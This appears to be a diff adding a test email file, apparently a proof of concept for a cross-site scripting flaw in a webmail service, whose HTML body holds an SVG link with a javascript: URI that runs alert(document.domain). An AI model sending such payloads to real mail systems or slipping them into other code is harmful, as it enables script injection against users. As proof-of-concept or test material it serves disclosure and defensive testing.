@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: asklfnskfnkl
+To: victim@sohu.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<svg><a xlink:href="javascript:alert(document.domain)" target="_blank"><text>AAAAA</text></a></svg>
